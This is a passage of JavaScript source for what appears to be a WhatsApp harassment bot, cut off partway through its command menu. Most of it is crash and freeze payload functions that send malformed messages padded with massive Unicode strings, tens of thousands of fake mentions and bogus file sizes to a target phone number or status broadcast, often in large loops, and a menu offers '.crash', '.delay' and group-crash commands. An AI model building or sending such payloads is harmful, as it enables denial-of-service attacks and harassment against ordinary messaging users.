          "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",

        thumbnailSha256:
          "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256:
          "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,

        imageDataHash:
          "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",

        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
      },
    },
    {
      participant: { jid: target },
    }
  );
}*/
/*async function blankcrash1(target) {
  try {
    const loopNya = 500;
    const Cards = 20;

    for (let i = 0; i < loopNya; i++) {
      let cards = [];

       for (let i = 0; j < Cards; j++) {
        cards.push({
          body: { text: "\u0000".repeat(10000) },
          footer: { text: "" },
          header: {
            title: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
              fileLength: "591",
              mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
              fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
              directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
              mediaKeyTimestamp: "1721344123",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD...",
              midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
            }
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  header: "ꦽ".repeat(10000),
                  body: "\x10".repeat(10000),
                  flow_action: "navigate",
                  flow_action_payload: { screen: "FORM_SCREEN" },
                  flow_cta: "Grattler",
                  flow_id: "1169834181134583",
                  flow_message_version: "3",
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                })
              }
            ]
          }
        });
      }

      const carousel = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000".repeat(10000) },
              footer: { text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" },
              header: { hasMediaAttachment: false },
              carouselMessage: { cards }
            }
          }
        }
      }, {});

      await zax.relayMessage(target, carousel.message, {
        messageId: carousel.key.id
      });
    }

  } catch (err) {
    console.error("❌ Error di:", err);
  }
}*/

async function crashblank(target, ptcp = false) {
  try {
    const largePayload = JSON.stringify({
      data: "💀".repeat(2000)
    });

    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "X-Angel InvosionSql",
              hasMediaAttachment: false
            },
            body: {
              text: "X-Angel InvosionSql💀",
            },
            nativeFlowMessage: {
              messageParamsJson: largePayload,
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    url: "https://example.com",
                    text: "Visit Website"
                  })
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    text: "Allow Call Access"
                  })
                },
                {
                  name: "payment",
                  buttonParamsJson: JSON.stringify({
                    currency: "USD",
                    amount: 999,
                    paymentText: "Donate $9.99"
                  })
                },
                {
                  name: "buy_button",
                  buttonParamsJson: JSON.stringify({
                    productId: "123456",
                    buttonText: "Buy Now"
                  })
                },
                {
                  name: "native_flow_cta",
                  buttonParamsJson: JSON.stringify({
                    flowId: "com.whatsapp.catalog",
                    text: "Open Catalog"
                  })
                }
              ]
            }
          }
        }
      }
    }, {});

    await zax.relayMessage(target, msg.message, ptcp ? {
      participant: { jid: target }
    } : {});

    console.log(chalk.green("done"));
  } catch (err) {
    console.error(chalk.red("Error in X-Angel InvosionSqlForce:"), err);
  }
}


/*async function blankcrash(target) {
  for (let r = 0; r < 1; r++) {
    try {
    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "VaxzyNotWhyy👀" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg = generateWAMessageFromContent(target, messagePayload, {});

    await zax.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });
    
    const msg1 = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "VaxzyOfficial🐉",
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 999999999,
                    degreesLongitude: -999999999,
                    name: '{'.repeat(100000),
                    address: '{'.repeat(100000),
                  },
                },
                contextInfo: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "X",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                body: {
                  text: "VaxzyOfficial🐉",
                },
                nativeFlowMessage: {
                  messageParamsJson: '{'.repeat(100000),
                },
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"),
                fileLength: "974197419741",
                pageCount: "974197419741",
                mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"),
                fileName: "𝄽‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌".repeat(70),
                fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"),
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173"
              }
            }
          }
        },
        {}
      );
      await zax.relayMessage(target, msg1.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
      
      const msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
              },
            },
            body: {
              text: "VaxzyIsHere៚",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

    await zax.relayMessage(target, msg2.message, {
      messageId: msg.key.id,
      participant: { jid: target },
    });
      
    const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyIsHere៚".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await zax.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });
    
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}
}
*/
async function delay5(target)  {
   const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 100000000,
         expectedVideoCount: 0, //trigger
      }
   }, {});
   
   const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
        mediaKeyTimestamp: 1758521043,
        isSampled: true, 
        viewOnce: false, 
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter", 
            newsletterName: "7eppeli", 
            contentType: "UPDATE_CARD", 
            accessibilityText: "\u0000".repeat(9000), 
            serverMessageId: 18888888
          }, 
          mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
        annotations: [
          {
            polygonVertices: [
              {
                x: 0.05515563115477562,
                y: 0.4132135510444641
              },
              {
                x: 0.9448351263999939,
                y: 0.4132135510444641
              },
              {
                x: 0.9448351263999939,
                y: 0.5867812633514404
              },
              {
                x: 0.05515563115477562,
                y: 0.5867812633514404
              }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "7eppeli",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(1000) 
            }
          }
        ]
     }
   };
   
   const messages = [];
   for (let i = 0; i < 100000; i++) {

      const imgMsg = await generateWAMessageFromContent(target, imagePayload, {});  
      imgMsg.message.messageContextInfo = {  
         messageAssociation: {  
            associationType: 1,  
            parentMessageKey: album.key  
         }  
      };  
      messages.push(imgMsg);
   }

   await zax.relayMessage("status@broadcast", album.message, {
      messageId: album.key.id,
      statusJidList: [target]
   });
   
   for (const msg of messages) {
      await zax.relayMessage("status@broadcast", msg.message, {
         messageId: msg.key.id,
         statusJidList: [target]
      });
   }
}

async function Delay4(zax, target) {
  try {
    const mentions = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const corruptedJson = "{".repeat(500000);

    const fakeImage = {
      mimetype: "image/jpeg",
      caption: "",
      fileLength: "9999999999999",
      fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
      fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
      mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
      height: 1,
      width: 1,
      jpegThumbnail: Buffer.from("").toString("base64"),
      contextInfo: {
        mentionedJid: mentions,
        forwardingScore: 9999,
        isForwarded: true,
        participant: "0@s.whatsapp.net"
      }
    };

    const payload = {
      viewOnceMessage: {
        message: {
          imageMessage: fakeImage,
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝐀𝐗𝐆𝐀𝐍𝐊 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              mentionedJid: mentions,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await zax.relayMessage("status@broadcast", payload, {
      messageId: null,
      statusJidList: [target]
    });

    console.log("Delay 1 Hard Bug Send To Target");
  } catch (err) {
    console.error("❌ Error kirim Delay 1:", err);
  }
}

async function Delay2(zax, target) {
  try {
    const mentions40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mentions16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const corruptedJson = "{".repeat(500000);

    const fakeImage = {
      mimetype: "image/jpeg",
      caption: "",
      fileLength: "9999999999999",
      fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
      fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
      mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
      height: 1,
      width: 1,
      jpegThumbnail: Buffer.from("").toString("base64"),
      contextInfo: {
        mentionedJid: mentions40k,
        forwardingScore: 9999,
        isForwarded: true,
        participant: "0@s.whatsapp.net"
      }
    };

    const comboPayload = {
      viewOnceMessage: {
        message: {
          imageMessage: fakeImage,
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝐀𝐗𝐆𝐀𝐍𝐊 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              mentionedJid: mentions40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          conversation: "\u2063".repeat(1000),
          contextInfo: {
            externalAdReply: {
              title: "𝐀𝐗𝐆𝐀𝐍𝐊 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒",
              body: "Delay 2 Hard Bug",
              thumbnailUrl: "https://files.catbox.moe/nuotqm.jpg",
              mediaType: 1,
              sourceUrl: "https://t.me/LuciferNotDev",
              showAdAttribution: false
            },
            mentionedJid: mentions16k
          },
          interactiveResponseMessage: {
            body: { text: "༑ 𝐀𝐗𝐆𝐀𝐍𝐊 炎", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "꧔꧈".repeat(9000),
              version: 3
            }
          }
        }
      },
      nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
        status: true,
        cameraAccess: true
      }
    };

    const msg = await generateWAMessageFromContent(target, comboPayload, {});

    await zax.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });

    await zax.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });

    console.log("DELAY 2 BUG SEND TO TARGET");
  } catch (err) {
    console.error("❌ Error in Delay2:", err);
  }
}

async function Delay3(zax, target) {
    const mentionedJids = Array.from({ length: 1600 }, () => 
        `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`
    );

    let msg;

    for (let i = 0; i < 999999; i++) {
        const msgContent = {
            viewOnceMessage: {
                message: {
                    conversation: "\u2063".repeat(1000),
                    contextInfo: {
                        externalAdReply: {
                            title: "𝐀𝐗𝐆𝐀𝐍𝐊 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒",
                            body: "𝐀𝐗𝐆𝐀𝐍𝐊 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒",
                            thumbnailUrl: "https://files.catbox.moe/nuotqm.jpg",
                            mediaType: 1,
                            sourceUrl: "https://t.me/LuciferNotDev",
                            showAdAttribution: false
                        },
                        mentionedJid: mentionedJids
                    },
                    interactiveResponseMessage: {
                        body: {
                            text: "🩸 ༑ 𝐀𝐗𝐆𝐀𝐍𝐊 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "꧔꧈".repeat(9000),
                            version: 3
                        }
                    }
                }
            },
            nativeFlowMessage: {
                name: "call_permission_request",
                messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                status: true,
                cameraAccess: true
            }
        };

        msg = await generateWAMessageFromContent(target, msgContent, {});
        await new Promise(resolve => setTimeout(resolve, 300));
    }

    await zax.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await zax.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function delay1(zax, target) {
    const apa = "𑜦𑜠".repeat(20000) + "ꦾ".repeat(40000);
    
    let biyak = [];
    for (let i = 0; i < 20; i++) {
        biyak.push({
            name: "cta_url" + i,
            buttonParamsJson: JSON.stringify({
                display_text: "ꦽ".repeat(3000)
            })
        });
    }

    let pesan1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: apa,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: apa
                    },
                    nativeFlowMessage: {
                        buttons: biyak
                    },
                    contextInfo: {
                        mentionedJid: Array.from({length: 1900}, (_, i) => `1${i}@s.whatsapp.net`)
                    }
                }
            }
        }
    };

    let pesan2 = {
        productListMessage: {
            title: apa,
            products: [
                {
                    productId: "taek_1",
                    title: apa,
                    description: apa,
                },
                {
                    productId: "Whykha_15", 
                    title: apa,
                    description: apa,
                }
            ],
            body: apa,
        }
    };

    let pesan3 = {
        listMessage: {
            title: "List " + apa,
            description: apa,
            buttonText: "entah",
            sections: [
                {
                    title: "Ekha",
                    rows: [
                        {
                            title: apa,
                            description: apa,
                        },
                        {
                            title: apa,
                            description: apa
                        }
                    ]
                }
            ]
        }
    };

    let pesan4 = {
        collectionMessage: {
            bannerMessage: {
                title: apa,
                body: apa,
            },
            productSections: [
                {
                    title: "pantek",
                    products: [
                        {
                            title: apa,
                            description: apa,
                        }
                    ]
                }
            ]
        }
    };

    await zax.relayMessage(target, pesan1, {messageId: null, participant: {jid: target}});
    await zax.relayMessage(target, pesan2, {messageId: null, participant: {jid: target}});
    await zax.relayMessage(target, pesan3, {messageId: null, participant: {jid: target}});
    await zax.relayMessage(target, pesan4, {messageId: null, participant: {jid: target}});

    console.log("Pesan terkirim ke " + target);
}

async function loc(jid) {
  await zax.relayMessage(jid, {
    locationMessage: {
      degreesLongitude: 90.0,
      degreesLatitude: -90.0, 
      name: "👁‍🗨⃟꙰。⃝zax ‌‌⃰ ⌁ universe.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000), 
      url: "t.me/zaxsql"
    }
  }, {
    participant: {
      jid
    }
  }) 
}

async function locgb(jid, isGroup = false) {
    await zax.relayMessage(jid, {
        locationMessage: {
            degreesLongitude: 90.0,
            degreesLatitude: -90.0,  
            name: "👁‍🗨⃟꙰。⃝zax ‌ uni‌⃰ ⌁ verse.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000), 
            url: "t.me/zaxsql"
        }
    }, isGroup ? {} : { participant: { jid } });
}

async function freezegb(target, group = false) {
    const message = generateWAMessageFromContent(target, {
        groupInviteMessage: {
            groupJid: `${Math.floor(Math.random() * 7202508)}@g.us`,
            groupName: "🧪⃟꙰。⌁𝟕𝐞𝐩 𝐩𝐞𝐥 ⃰𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝" + "𑇂𑆵𑆴𑆿".repeat(15000),
            caption: "🧪⃟꙰。⌁𝟕𝐞𝐩 𝐩𝐞𝐥 ⃰𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝" + "𑇂𑆵𑆴𑆿".repeat(15000),
            inviteCode: crypto.randomBytes(72).toString('hex').toUpperCase(),
            inviteExpiration: "720594829",
            contextInfo: {
                quotedMessage: {
                    conversation: "𑇂𑆵𑆴𑆿".repeat(15000)
                }
            },
            jpegThumbnail: zaxyzy  
        }
    }, {});
    
    await zax.relayMessage(target,  
        message.message,
        group ?
        {
            messageId: message.key.id
        } : {
            participant: {
                jid: target
            },
            messageId: message.key.id
        }
    );
}

async function XiosVirus(IsTarget, group = false) {
  const message = await generateWAMessageFromContent(IsTarget, {
    extendedTextMessage: {
      text: "⭑‌⟅ ༑ ▾ 𝐙‌𝐄‌𝐑‌𝐎 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻ ▾ ༑‌⟆ ⭑‌" + "𑇂𑆵𑆴𑆿".repeat(15000),
      contextInfo: {
        stanzaId: IsTarget,
        participant: "0@s.whatsapp.net",  // ← JANGAN PAKAI IsTarget DI SINI
        quotedMessage: {
          conversation: "⭑‌⟅ ༑ ▾ 𝐙‌𝐄‌𝐑‌𝐎 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻ ▾ ༑‌⟆ ⭑‌" + "𑇂𑆵𑆴𑆿".repeat(25000)
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  }, {});
  
  await zax.relayMessage(IsTarget, message.message, group ? 
     { messageId: message.key.id } :
     { participant: { jid: IsTarget }, messageId: message.key.id });
  console.log(chalk.green("✅ Send Bug By GetsuzoZero🐉"));
}

//=======================\\
// FUNC FREZECHAT
//=======================\\
async function frezechat(IsTarget, ptcp = false) {
  const msg = {
    groupInviteMessage: {
        groupName: "ཹ".repeat(130000),
        groupJid: '6285709664923-1627579259@g.us',
        inviteCode: 'h+64P9RhJDzgXSPf',
        inviteExpiration: '999',
        caption: `🧬⃟༑⌁⃰𝐙‌𝐞𝐫‌𝐨 𝐂𝐨𝐧‌‌𝐜𝐮‌𝐞𝐫𝐫𝐨𝐫ཀ‌‌🪅`,
        jpegThumbnail: zaxyzy  // ← GANTI 7izxvelzImg dengan zaxyzy
    }
  };
  
  await zax.relayMessage(IsTarget, msg, ptcp ? 
     { messageId: generateMessageID() } :
     { participant: { jid: IsTarget }, messageId: generateMessageID() });
}

//=======================\\
// FUNC SW CRASH - ALL IN ONE
//=======================\\
async function swCrash(target, isGroup = false, jumlah = 20, type = 'random') {
    try {
        // Caption super panjang (repeat + karakter invisible)
        let captionPanjang = "💀 SW CRASH 💀".repeat(5000) + "𑇂𑆵𑆴𑆿".repeat(20000);
        
        // Buffer berbagai ukuran
        let buffers = {
            small: Buffer.alloc(1024 * 512),  // 0.5MB
            medium: Buffer.alloc(1024 * 1024), // 1MB
            large: Buffer.alloc(1024 * 1024 * 3), // 3MB
            extreme: Buffer.alloc(1024 * 1024 * 5) // 5MB
        };
        
        let types = ['image', 'video', 'audio', 'text'];
        let success = 0;
        
        for (let i = 0; i < jumlah; i++) {
            try {
                let selectedType = type;
                let messageContent = {};
                
                // Kalo type = random, pilih random
                if (type === 'random') {
                    selectedType = types[Math.floor(Math.random() * types.length)];
                }
                
                // Pilih ukuran buffer random (kecuali text)
                let size = ['small', 'medium', 'large', 'extreme'][Math.floor(Math.random() * 4)];
                
                switch(selectedType) {
                    case 'image':
                        messageContent = {
                            image: buffers[size],
                            caption: captionPanjang + ` [IMG-${i+1}/${jumlah}]`
                        };
                        break;
                        
                    case 'video':
                        messageContent = {
                            video: buffers[size],
                            caption: captionPanjang + ` [VID-${i+1}/${jumlah}]`
                        };
                        break;
                        
                    case 'audio':
                        messageContent = {
                            audio: buffers[size],
                            caption: captionPanjang + ` [AUD-${i+1}/${jumlah}]`
                        };
                        break;
                        
                    case 'text':
                        messageContent = {
                            text: captionPanjang + ` [TXT-${i+1}/${jumlah}]`
                        };
                        break;
                }
                
                await zax.sendMessage(target, {
                    groupStatusMessage: messageContent
                }, isGroup ? {} : { quoted: null });
                
                success++;
                console.log(`✅ [${i+1}/${jumlah}] ${selectedType} | ${size} | terkirim`);
                
                // Delay variasi biar gak kena limit
                await sleep(200 + Math.floor(Math.random() * 200));
                
            } catch (e) {
                console.log(`❌ Gagal ke-${i+1}:`, e.message);
            }
        }
        
        return success;
    } catch (e) {
        console.log("❌ Fatal error:", e.message);
        return 0;
    }
}
//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
/*case 'menu': {
await zax.sendMessage(m.chat, {
  interactiveMessage: {
     title: `─ Hello ${m.pushName}, My Name is zax-berse, I am an Automated Bot That Works To Help 

─ ! Information
- bots name : sql-exp 
- Creator : azaxm
- Contact dvp : t.me/zaxsql | t.me/nanastfx
- Channels : https://t.me/universql
- Version : 1.0
- Runtime : ${runtime(process.uptime())}

─ ! Bug Menu
- .delay 62××
- .crash 62××
- .blank 62××

─ ! Bug Group
- .crash-gb https or id
- .swgroup <id>


─ ! Owner menu
- .addown ( 62××× )
- .delown ( 62××× )
- .addprem ( 62××× )
- .delprem ( 62××× )
- .public
- .self 
`, 
  footer: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴀᴢᴀxᴍ",
            image: { url: './System/Thumbnail.jpg' },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "ᴢᴀx-ᴠᴇʀsᴇ",
                        url: "t.me/universql",
                        copy_code: "#about me ambatuzkam",
                        expiration_time: Date.now() + 86400000
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2, 
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "#zax-verse",
                        button_title: "</>"
                    },
                    tap_target_configuration: {
                        title: " X ",
                        description: "bomboclard",
                        canonical_url: "https://t.me/universql",
                        domain: "id.wwbs.net",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝕬𝖑𝖑 𝕸𝖊𝖓𝖚",
                            sections: [
                                {
                                    title: "𝕭𝖚𝖌𝖘 𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕",
                                    highlight_label: "⚠️",
                                    rows: [
                                        {
                                            title: "ḑ̴̞͛̒ẹ̿͋̒̕l̙͖̑̾ͣā̤̓̍͘y҉̃̀̋̑",
                                            description: "delay",
                                            id: ".delay"
                                        },
                                        {
                                            title: "B̩͎͍̾ͅl̙͖̑̾ͣā̤̓̍͘ṇ̤͛̒̍ḳ̯͍̑ͦ ā̤̓̍͘ṇ̤͛̒̍ḑ̴̞͛̒r̴̨̦͕̝o̯̱̊͊͢",
                                            description: "Blank",
                                            id: ".blank"
                                        },
                                        {
                                            title: "c͕͗ͤ̕c͕͗ͤ̕̕r̴̨̦͕̝ā̤̓̍͘s̠҉͍͊ͅḣ̖̻͛̓",
                                            description: "crash ui for andro and iphone",
                                            id: ".crash"
                                        }
                                    ]
                                },
                                {
                                    title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
                                    highlight_label: "only own",
                                    rows: [
                                        {
                                            title: "➕ Add Owner",
                                            description: "Tambah owner baru",
                                            id: ".ddowner"
                                        },
                                        {
                                            title: "➖ Del Owner",
                                            description: "Hapus owner",
                                            id: ".delowner"
                                        },
                                        {
                                            title: "💎 Add Premium",
